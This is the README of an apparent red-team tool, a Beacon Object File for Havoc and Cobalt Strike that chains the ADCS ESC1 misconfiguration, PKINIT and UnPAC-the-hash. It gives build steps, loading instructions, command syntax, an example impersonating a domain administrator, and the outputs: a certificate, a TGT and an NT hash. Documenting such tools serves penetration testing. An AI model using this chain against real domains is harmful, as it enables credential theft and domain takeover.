# ESC1-unPAC

ADCS ESC1 exploitation BOF for Havoc and Cobalt Strike.

**Complete attack chain:** ESC1 → PKINIT → UnPAC-the-hash

## Demo

https://github.com/RayRRT/ESC1-unPAC/raw/refs/heads/main/esc1unpac.mp4

## Build

```bash
git clone https://github.com/RayRRT/BOFs.git && cd ESC1-unPAC && chmod +x build.sh && ./build.sh
```

## Usage

### Havoc
1. Scripts → Load Script → `havoc/esc1-unpac.py`

### Cobalt Strike
1. Script Manager → Load → `cobaltstrike/esc1-unpac.cna`

### Command
```
esc1-unpac <CA> <Template> <UPN> [KDC]
```

### Example
```
esc1-unpac EVILCA1.evilcorp.net\\evilcorp-EVILCA1-CA ESC1Template administrator@evilcorp.net
```

## Output

- PFX certificate (base64, password: `SpicyAD123`)
- TGT in kirbi format (Rubeus compatible)
- NT Hash

## References

- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [KB5014754 - Strong Certificate Mapping](https://support.microsoft.com/en-us/topic/kb5014754)
